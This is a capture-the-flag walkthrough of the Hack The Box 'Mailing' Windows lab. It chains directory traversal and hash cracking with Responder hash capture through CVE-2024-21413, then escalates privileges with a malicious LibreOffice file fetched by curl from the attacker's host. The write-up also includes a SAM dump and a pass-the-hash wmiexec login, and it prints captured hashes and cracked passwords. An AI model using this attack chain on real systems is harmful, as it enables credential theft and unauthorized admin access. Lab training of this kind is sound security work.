# HTB-Mailing-Writeup-Walkthrough
@EnisisTourist

In this writeup, we delve into the Mailing box, the first Windows machine of Hack The Box’s Season 5. This detailed walkthrough covers the key steps and methodologies used to exploit the machine and gain root access. Let’s explore how to tackle the challenges presented by Mailing.

Scanning and Enumeration
Nmap Scan
To start, we perform a comprehensive Nmap scan to identify open ports and services:

bash
nmap -Pn -sC -sV -oA tcp -p- -T4 -vvvvv — reason 10.10.11.14

Scan Results:

PORT STATE SERVICE REASON VERSION
25/tcp open smtp syn-ack hMailServer smtpd
80/tcp open http syn-ack Microsoft IIS httpd 10.0
110/tcp open pop3 syn-ack hMailServer pop3d
135/tcp open msrpc syn-ack Microsoft Windows RPC
139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn
143/tcp open imap syn-ack hMailServer imapd
445/tcp open microsoft-ds? syn-ack
587/tcp open smtp syn-ack hMailServer smtpd
993/tcp open ssl/imap syn-ack hMailServer imapd
5040/tcp open unknown syn-ack
5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp open pando-pub? syn-ack
47001/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49665/tcp open msrpc syn-ack Microsoft Windows RPC
49666/tcp open msrpc syn-ack Microsoft Windows RPC
49667/tcp open msrpc syn-ack Microsoft Windows RPC
49668/tcp open msrpc syn-ack Microsoft Windows RPC
49669/tcp open msrpc syn-ack Microsoft Windows RPC

Service Details:
- SMTP, IMAP, and POP3 services are running on hMailServer.
- HTTP services are hosted on Microsoft IIS.
- RPC and NetBIOS services are exposed.

Web Enumeration
Initial Web Page Examination
Navigating to http://mailing.htb presents a page that does not provide useful information. We proceed with directory busting to uncover hidden paths.

Directory Busting with dirsearch
We use “dirsearch” to identify potentially hidden directories and files:

bash
dirsearch -u http://mailing.htb/ -x 403,404,400

Notable Findings:

301 — /assets -> http://mailing.htb/assets/
200 — /assets/
200 — /download.php

Exploration of /download.php :
Intercepting the request with Burp Suite reveals that directory traversal might be possible. This allows us to retrieve sensitive information.

Password Cracking

Obtaining and Cracking the Password
We find an MD5 hash which we need to crack. Using `hashcat`, we attempt to crack the password:

bash
hashcat -a 0 -m 0 841bb5acfa6779ae432fd7a4e6600ba7 /usr/share/wordlists/rockyou.txt

![image](https://github.com/user-attachments/assets/46946cd8-6131-40e9-a8b5-92cac8687e84)
Cracking Results:
841bb5acfa6779ae432fd7a4e6600ba7:homenetworkingadministrator

Exploiting a Vulnerability

Using CVE-2024–21413
We find that CVE-2024–21413, a remote code execution vulnerability in Microsoft Outlook, could be exploited to capture a user hash. The exploit code is available at [this GitHub repository](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability).

Setting Up Responder:
To capture the hash, start Responder with the following command:

bash
sudo responder -I tun0

![image](https://github.com/user-attachments/assets/329bea2f-423a-4af9-9100-f2d787c84f1f)

![image](https://github.com/user-attachments/assets/c6ea518e-90fb-4a7a-9ada-201e0b9e05a1)


Responder Output:
Responser is running with NBT-NS, LLMNR, MDNS, and other poisoning techniques enabled.

[SMB] NTLMv2-SSP Client : 10.10.11.14
[SMB] NTLMv2-SSP Username : MAILING\maya
[SMB] NTLMv2-SSP Hash : maya::MAILING:95de498996a31a8c:D2BABC773FF653EE285D33E6FE5493A6:010100000000000080F2298488B6DA015D1DCBB264E2490C0000000002000800530059005500490001001E00570049004E002D005A004F0042005000340036004D0038004B005600410004003400570049004E002D005A004F0042005000340036004D0038004B00560041002E0053005900550049002E004C004F00430041004C000300140053005900550049002E004C004F00430041004C000500140053005900550049002E004C004F00430041004C000700080080F2298488B6DA0106000400020000000800300030000000000000000000000000200000C9E5BC0C7D84E948E12CF5D180E24C511C66B448EF8DB310790EDB6AD72669FF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000
[*] Skipping previously captured hash for MAILING\maya

NTLMv2 Hash Cracking

1. Identify the Hash and Algorithm:
— Hash type: NTLMv2

2. Command:
bash
hashcat -a 0 -m 5600 maya::MAILING:95de498996a31a8c:D2BABC773FF653EE285D33E6FE5493A6:010100000000000080F2298488B6DA015D1DCBB264E2490C0000000002000800530059005500490001001E00570049004E002D005A004F0042005000340036004D0038004B005600410004003400570049004E002D005A004F0042005000340036004D0038004B00560041002E0053005900550049002E004C004F00430041004C000300140053005900550049002E004C004F00430041004C000500140053005900550049002E004C004F00430041004C000700080080F2298488B6DA0106000400020000000800300030000000000000000000000000200000C9E5BC0C7D84E948E12CF5D180E24C511C66B448EF8DB310790EDB6AD72669FF0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000 /usr/share/wordlists/rockyou.txt

— a 0 specifies a dictionary attack.
— m 5600 indicates NTLMv2 hash.

3. Output:
MAYA::MAILING:95de498996a31a8c:d2babc773ff653ee285d33e6fe5493a6:010100000000000080f2298488b6da015d1dcbb264e2490c0000000002000800530059005500490001001e00570049004e002d005a004f0042005000340036004d0038004b005600410004003400570049004e002d005a004f0042005000340036004d0038004b00560041002e0053005900550049002e004c004f00430041004c000300140053005900550049002e004c004f00430041004c000500140053005900550049002e004c004f00430041004c000700080080f2298488b6da0106000400020000000800300030000000000000000000000000200000c9e5bc0c7d84e948e12cf5d180e24c511c66b448ef8db310790edb6ad72669ff0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00370031000000000000000000:m4y4ngs4ri
— This means the NTLMv2 hash corresponds to the password “m4y4ngs4ri”.

![image](https://github.com/user-attachments/assets/e2273c5c-504f-41f7-9f17-6cb7c462f1e5)
![image](https://github.com/user-attachments/assets/7a5c89c9-49fc-40ff-bf78-96dd87403851)


To use evil-winrm effectively, the Windows Remote Management (WinRM) service must be accessible over the network. This typically involves two specific ports:

1. Port 5985 (HTTP): This is the default port for WinRM over HTTP.

2. Port 5986 (HTTPS): This is used for WinRM over HTTPS, providing encrypted communication.

Nmap mention that 5985 is open
![image](https://github.com/user-attachments/assets/973f474b-2e11-43d0-8884-7213eadd0f3f)
![image](https://github.com/user-attachments/assets/f3150541-aa29-48f4-83a7-7ff2986ce566)

we find the user flag

Root Flag
After some exploration on the system, you were able to find a LibreOffice file with an interesting version. Here’s a revised explanation of the process:

1. Exploration: While investigating the system, you identified a LibreOffice file that seemed relevant. This file, exploit.odt, was particularly noteworthy because it had a specific version of LibreOffice associated with it.

2. LibreOffice File Version: You checked the version of LibreOffice used to create or modify this file. This detail was crucial because it might influence the type of vulnerabilities or exploits that could be relevant.

Evil-WinRM* PS C:\program files\libreoffice\readmes> type readme_en-US.txt

We discovered the version of LibreOffice 7.4

Gaining Admin Access Using CVE-2023–2255

https://github.com/elweth-sec/CVE-2023-2255

I discovered an exploit for elevating user privileges using CVE-2023–2255, which can be found on GitHub here. By leveraging this particular CVE, I was able to create a custom exploit to grant admin access to the user “maya.”

Use command in target machine “curl -o output.odt <IP ADDRESS>:<PORT>/output.odt”

Port 8000

![image](https://github.com/user-attachments/assets/f02eb8b5-49f9-447a-b29c-816342319910)
![image](https://github.com/user-attachments/assets/b32ce984-3d85-4ac7-a12f-ed6817c63fe7)

![image](https://github.com/user-attachments/assets/6ad1e5f9-62dd-4856-88d4-49b34b2a22a9)

![image](https://github.com/user-attachments/assets/e0d831e0-3318-42ba-aecf-b1ae8e6c3db6)
• crackmapexec: The main tool being used, which is a Swiss Army knife for pentesting Windows/Active Directory environments.

• smb: Specifies that the SMB protocol is being targeted.

• 10.10.11.14: The IP address of the target machine running SMB services.

• -u maya: The username (maya) used for authentication.

• -p “m4y4ngs4ri”: The password for the specified username.

• — sam: This option is used to retrieve the Security Account Manager (SAM) database, which contains user account information and password hashes.

We use

bash

impacket-wmiexec localadmin@10.10.11.14 -hashes “aad3b435b51404eeaad3b435b51404ee:9aa582783780d1546d62f2d102daefae”
![image](https://github.com/user-attachments/assets/7d342e72-ee33-43a5-9bbb-6ed993652ffc)

To find the root flag, I exploited CVE-2023–2255 to grant “maya” admin privileges. This allowed me to easily locate the root flag on the system.

This concludes the writeup for this machine.

Happy hacking!
